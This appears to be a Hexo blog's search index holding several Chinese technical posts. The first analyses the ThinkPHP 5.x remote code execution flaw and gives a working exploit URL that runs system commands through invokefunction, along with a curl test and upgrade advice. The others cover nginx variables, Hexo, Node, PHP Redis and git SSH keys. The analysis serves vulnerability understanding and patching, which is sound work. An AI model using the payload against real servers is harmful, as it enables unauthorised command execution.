<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ThinkPHP 5.x 远程代码getshell漏洞]]></title>
    <url>%2F2018%2F12%2F26%2FThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81getshell%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[ThinkPHP 简介ThinkPHP 是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，因为其易用性、扩展性，已经成长为国内颇具影响力的WEB应用开发框架 漏洞解析漏洞引发的原因是框架对控制器名没有进行足够的检测，现拉取ThinkPHP v5.0.22 来进行测试 12345678910请求路由 =&gt; http://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l系统解析为 =&gt; 模块：index =&gt; 控制器：\think\app =&gt; 方法：invokefunction =&gt; 参数列表： =&gt; function=call_user_func_array =&gt; vars[0]=system =&gt; vars[1][]=ls%20-l 跟踪到路由解析代码 \thinkphp\library\think\App.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * 执行模块 * @access public * @param array $result 模块/控制器/操作 * @param array $config 配置参数 * @param bool $convert 是否自动转换控制器和操作名 * @return mixed * @throws HttpException */public static function module($result, $config, $convert = null)&#123; // ====================================================== // 未进行过滤直接以 / 分解来进行解析 // ====================================================== if (is_string($result)) &#123; $result = explode(&apos;/&apos;, $result); &#125; ... // ====================================================== // 未进行过滤直接赋值为 $result[1] 即 \think\app 并进行实例化 // ====================================================== $instance = Loader::controller( $controller, // \think\app $config[&apos;url_controller_layer&apos;], $config[&apos;controller_suffix&apos;], $config[&apos;empty_controller&apos;] ); ... // ========================================= // 传递 $result[2] 即 invokefunction 方法 // is_callable([$instance, &quot;invokefunction&quot;] // ========================================= if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config[&apos;action_suffix&apos;]; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); ... return self::invokeMethod($call, $vars); .../** * 调用反射执行类的方法 支持参数绑定 * @access public * @param string|array $method 方法 * @param array $vars 变量 * @return mixed */public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \ReflectionMethod($class, $method[1]); &#125; else &#123; // 静态方法 $reflect = new \ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars); // =============================================== // 传递uri参数 // var_dump($args); // -------------------------- // array(2) &#123; // [0]=&gt; // string(20) &quot;call_user_func_array&quot; // [1]=&gt; // array(2) &#123; // [0]=&gt; // string(6) &quot;system&quot; // [1]=&gt; // array(1) &#123; // [0]=&gt; // string(5) &quot;ls -l&quot; // &#125; // &#125; // &#125; // =============================================== self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;class . &apos;-&gt;&apos; . $reflect-&gt;name . &apos;[ &apos; . $reflect-&gt;getFileName() . &apos; ]&apos;, &apos;info&apos;); // ======================================================= // 即通过 invokeFunction 传递系统调用给 call_user_func_array // 从而调用 system(&quot;ls -l&quot;) // ======================================================= return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125;.../** * 执行函数或者闭包方法 支持参数调用 * @access public * @param string|array|\Closure $function 函数或者闭包 * @param array $vars 变量 * @return mixed */public static function invokeFunction($function, $vars = [])&#123; $reflect = new \ReflectionFunction($function); $args = self::bindParams($reflect, $vars); // 记录执行信息 self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;); return $reflect-&gt;invokeArgs($args);&#125; 123456789漏洞测试结果# curl &quot;http://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l&quot;total 13-rw-r--r-- 1 pc-user 197121 850 Sep 7 21:33 favicon.ico-rw-r--r-- 1 pc-user 197121 766 Sep 7 21:33 index.php-rw-r--r-- 1 pc-user 197121 24 Sep 7 21:33 robots.txt-rw-r--r-- 1 pc-user 197121 840 Sep 7 21:33 router.phpdrwxr-xr-x 1 pc-user 197121 0 Dec 26 22:18 static 受影响版本范围ThinkPHP 5.0.x &lt; 5.0.23ThinkPHP 5.1.x &lt; 5.1.31 大家看一下相关链接中github版本列表，参考github release列表的更新内容，选择对自己升级影响最小的，最好的话就是直接升级到最新版本，要想不受漏洞影响，至少应该升级为ThinkPHP 5.0.23ThinkPHP 5.1.31123456789101112composer require topthink/framework=v5.0.23composer require topthink/framework=v5.1.31升级后确认版本已更新# composer show topthink/frameworkname : topthink/frameworkdescrip. : the new thinkphp frameworkkeywords : framework, orm, thinkphpversions : * v5.0.23type : think-framework... 相关链接ThinkPHP composer包列表(composer 可以拉取的版本列表)ThinkPHP github版本列表(更新内容说明参考)ThinkPHP 官方漏洞说明]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nginx配置总结]]></title>
    <url>%2F2018%2F12%2F03%2Fnginx%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[平时使用nginx的过程发现有很多零碎的东西在网上很难查看，因此总结归纳一下，主要列举了nginx常用的变量和围绕一些知识点展示用例。 nginx 全局变量请求http报文如下123456789101112Request URL: http://www.test1.com/?test_var=123&amp;test_var2=456Request Method: POSTStatus Code: 200 OKRemote Address: 127.0.0.1:80Referrer Policy: no-referrer-when-downgradeAccept: */*Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://www.test.comReferer: http://www.test.com/test.htmlUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36post_test_var=789&amp;POst_test_var1=101112 nginx全局变量列举： 变量 值 说明 $remote_addr 127.0.0.1 客户端IP地址； $http_origin http://www.test.com HOST； $http_referer http://www.test.com/test.html origin源； $http_host www.test1.com Referer； $args test_var=123&amp;test_var2=456 #这个变量等于请求行中的参数，同$query_string $content_length 39 请求头中的Content-length字段。 $content_type application/x-www-form-urlencoded; charset=UTF-8 请求头中的Content-Type字段。 $document_root D:/phpStudy/WWW 当前请求在root指令中指定的值。 $host www.test1.com 请求主机头字段，否则为服务器名称。 $http_user_agent http_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537. 客户端agent信息 $http_cookie 客户端cookie信息 $limit_rate 0 这个变量可以限制连接速率。 $request_method POST 客户端请求的动作，通常为GET或POST。 $remote_addr 127.0.0.1 客户端的IP地址。 $remote_port 65002 客户端的端口。 $remote_user 已经经过Auth Basic Module验证的用户名。 $request_filename D:/phpStudy/WWW/ 当前请求的文件路径，由root或alias指令与URI请求生成。 $scheme http HTTP方法（如http，https）。 $server_protocol HTTP/1.1 请求使用的协议，通常是HTTP/1.0或HTTP/1.1。 $server_addr 127.0.0.1 服务器地址，在完成一次系统调用后可以确定这个值。 $server_name www.test1.com 服务器名称。 $server_port 80 请求到达服务器的端口号。 $request_uri /?test_var=123&amp;test_var2=456 包含请求参数的原始URI，不包含主机名，如 ”/foo/bar.php?arg=baz”。 $uri / 不带请求参数的当前URI，$uri不包含主机名，如”/foo/bar.html”。 $document_uri / 与$uri相同。]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客搭建教程]]></title>
    <url>%2F2018%2F11%2F08%2Fhexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[这篇博文介绍了我在搭建Hexo+Next主题时遇到的各种需要处理的问题。博客使用过程中也会继续不断完善。 环境1234567891011121314151617$ hexo -vhexo: 3.8.0hexo-cli: 1.1.0os: Windows_NT 10.0.17134 win32 x64node: 8.9.3http_parser: 2.7.0v8: 6.1.534.48uv: 1.15.0zlib: 1.2.11ares: 1.10.1-DEVmodules: 57nghttp2: 1.25.0openssl: 1.0.2nicu: 59.1unicode: 9.0cldr: 31.0.1tz: 2017b 评论第三方集成服务-来必力Next主题自带，这里我使用的是 来必力，注册后获取 LiveRe UID，直接改主题配置文件1livere_uid: #your livere_uid 如果无法注册请科学上网，注册时会显示一堆韩文，大致意思是去邮箱看验证码注册完登录选择 city 服务，然后进入授权码页复制以下 data-uid12&lt;!-- 来必力City版安装代码 --&gt;&lt;div id=&quot;lv-container&quot; data-id=&quot;city&quot; data-uid=&quot;********&quot;&gt; 统计第三方集成服务-不蒜子统计不蒜子统计官网Next主题自带，这里我使用的是 不蒜子统计，直接改主题配置文件12busuanzi_count: enable: true 统计显示异常deploy博客后发现统计显示异常，调试后发现不蒜子的JS 404 加载不出来了。到官网看了一下，原来旧域名过期。 解决方法1）找到NexT下引用不蒜子统计的文件。路径为/theme/next/layout/_third-party/analytics/busuanzi-counter.swig2）替换js链接123456789将&lt;div class=&quot;busuanzi-count&quot;&gt; &lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;替换为&lt;div class=&quot;busuanzi-count&quot;&gt; &lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 搜索Next主题自带有hexo-generator-search插件直接在主题配置文件themes/next/_config.yml下修改配置即可12local_search: enable: true 图片资源文件引入source 资源文件夹（类似于全局）对于少量或者公用的文件，可以存放在source资源文件夹例如 source/images/test.jpg通过 ![](/images/test.jpg) 来访问它们 文章资源文件夹（按文章分类）修改配置文件 _config.yml1post_asset_folder: true 资源文件管理功能打开后，每次创建新文章都会自动创建一个资源文件夹。 相对路径引用例如 _posts/post_name/img/test.jpg通过 ![](./img/test.jpg) 来访问它们 CDN引用除了在本地存储图片，还可以将图片上传到一些免费的CDN服务中。将生成的地址直接拿来引用即可。![](https://nodejs.org/static/images/logo.svg) 没有标签页、分类页没有标签页，tags 404每篇博文都可以设置对应的标签12345---title: hexo博客搭建教程date: 2018-11-08 10:04:36tags: hexo--- 调用以下命令生成标签页$ hexo new page tags 编辑主题配置文件，将tags添加到目录menu1234menu: home: / archives: /archives tags: /tags 使用多个标签标签的设置可以使用YAML语法1234567---title: hexo博客搭建教程date: 2018-11-08 10:04:36tags: - 标签1 - 标签2--- 没有分类页，categories 404给文章设置分类12345categories: - 一级分类 - 二级分类 - 三级分类 - ... 调用以下命令生成分类页$ hexo new page categories 编辑主题配置文件，将tags添加到目录menu12345menu: home: / categories: /categories/ archives: /archives/ tags: /tags/ 使用多级分类使用YAML语法123456789---title: hexo博客搭建教程date: 2018-11-08 10:04:36categories: - 一级分类 - 二级分类 - 三级分类 - ...--- 首页只显示文章摘要自动截取摘要在主题配置文件设置 enable:true12345# Automatically Excerpt. Not recommend.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150 但是这样子设置后，截取的摘要是纯文本，会很难看 手动设置摘要可以在每篇文章内使用标签&lt;!-- more --&gt;来手动设置123456789101112---title: hexo博客搭建教程date: 2018-11-08 10:04:36tags: - hexo---摘要内容&lt;!-- more --&gt;正文]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node环境搭建]]></title>
    <url>%2F2018%2F11%2F08%2Fnode%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[这篇博文介绍了各种搭建node方法以及加速方案。其中极力推荐使用n进行版本管理，特别方便。而且在国内推荐使用cnpm来加速依赖安装，特别爽。 node环境搭建下载安装通过源码编译node下载地址1234$ wget https://nodejs.org/dist/v10.13.0/node-v10.13.0.tar.gz$ tar -zxvf node-v10.13.0.tar.gz$ cd node-v10.13.0$ make &amp;&amp; make install 通过安装包安装根据系统环境以及选择安装包node下载地址 通过yum（CentOS）1$ yum install -y nodejs 版本切换（通过npm）12$ npm i -g n$ n 10 // 切换到v10 npm加速（cnpm）12$ npm i -g cnpm$ cnpm i // 使用cnpm 代表 npm命令 项目常规编译流程123$ cd 项目目录$ npm install$ npm run build]]></content>
  </entry>
  <entry>
    <title><![CDATA[PHP Redis 使用教程]]></title>
    <url>%2F2018%2F11%2F07%2FPHP-Redis-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[日常使用Redis的过程中发现搜到的文档对于使用方法、返回值这些都不是很全，因此写个文档整理在一起方便查找。除了比较难找的，后面会分配时间将常用的也不断补全。 连接connect使用方法：$redis-&gt;connect($host, $port)返回值：被移除key的数量参数：host服务地址； port端口号 用途：切换redis库12$redis = new Redis();$redis-&gt;connect('127.0.0.1', 6379); select使用方法：$redis-&gt;select($db_number)返回值：被移除key的数量参数：库对应的数值用途：切换redis库123$redis = new Redis();$redis-&gt;connect('127.0.0.1', 6379);$redis-&gt;select(1); // 切换到1库 键（KEY）del使用方法：$redis-&gt;del($key)返回值：被移除key的数量参数：可以是单个键或者键数组用途：删除指定键（单个或者多个） 12345678&lt;?php// 单个删除$key = 'test';$redis-&gt;del($key); // 返回1，键不存在则返回0// 批量删除$key_array = [ 'test1', 'test2', 'test3' ];$result = $redis-&gt;del($key_array); // 返回3 set使用方法：$redis-&gt;set($key, $value)返回值：true | false用途：设置键对应的值 get使用方法：$redis-&gt;get($key)返回值：键对应的值用途：获取键对应的值 123456&lt;?php$key = 'name';$redis-&gt;set($key, 'xiaoming');$redis-&gt;get($key); // 返回 xiaoming exists使用方法：$redis-&gt;exists($key)返回值：true | false用途：判断键是否存在 setex使用方法：$redis-&gt;setex(‘key’, 3600, ‘value’);用途：设置一小时超时时间 setnx使用方法：$redis-&gt;setnx(‘key’, ‘value’);用途：将key的值设为value，当且仅当key不存在。 若给定的key已经存在，则SETNX不做任何动作。123456$result = $redis-&gt;setnx(&apos;key&apos;, &apos;value&apos;);var_dump($result); // 首次设置键，返回true$result = $redis-&gt;setnx(&apos;key&apos;, &apos;value1&apos;);var_dump($result); // 库内已存在键，返回false$result = $redis-&gt;get(&apos;key&apos;);var_dump($result); // 返回 value Hash（哈希表）hmset使用方法：$redis-&gt;hmset($key, $value_array);返回值：true | false用途：给哈希表批量赋值（键值对）123456$value_array = [ &apos;key1&apos; =&gt; &apos;value1&apos;, &apos;key2&apos; =&gt; &apos;value2&apos;, &apos;key3&apos; =&gt; &apos;value3&apos;,];$redis-&gt;hmset($key, $value_array); // 设置成功，返回true hmget使用方法：$redis-&gt;setex($key, $value_array);用途：批量获取hash表的值，返回键值对，无键为false1234567891011121314151617$value_array = [ &apos;key1&apos;, &apos;key4&apos;, &apos;key5&apos;,];$result = $redis-&gt;hmget($key, $value_array);var_dump($result);===== output =====array(3) &#123; [&quot;key1&quot;]=&gt; string(6) &quot;value1&quot; [&quot;key4&quot;]=&gt; bool(false) // 未设置键，返回false [&quot;key5&quot;]=&gt; bool(false) // 未设置键，返回false&#125; 参考文档redis中文手册PHP-redis中文文档phpredis中文手册——《redis中文手册》 php版]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP Redis</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git管理密钥配置]]></title>
    <url>%2F2018%2F11%2F03%2Fgit%E7%AE%A1%E7%90%86%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[这篇博文介绍了如何配置git密钥，并在github使用git密钥来进行远程连接鉴权。 git下载下载地址 git配置12git config --global user.name "你的GitHub用户名"git config --global user.email "你的GitHub注册邮箱" 生成密钥12345ssh-keygen -t rsa -b 4096 -C "你的GitHub注册邮箱"Enter file in which to save the key // 密钥保存位置，回车默认Enter passphrase (empty for no passphrase): // 输入密码，直接回车Enter same passphrase again: // 输入确认密码，直接回车 github密钥管理github密钥管理直达链接1）New SSH Key，复制本地 ~/.ssh（window下为 C:\User\用户.ssh）的 id_rsa.pub2）Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去3）最后点击Add SSH key。 检验在Git Bash中检测GitHub公钥设置是否成功，输入ssh -T git@github.com 为不同网站应用各自的 SSH KEY编辑ssh配置 vim ~/.ssh/config追加以下内容123456789Host github.com HostName github.com User git IdentityFile ~/.ssh/id_rsa_aHost git.oschina.net HostName git.oschina.net User git IdentityFile ~/.ssh/id_rsa_b]]></content>
  </entry>
</search>
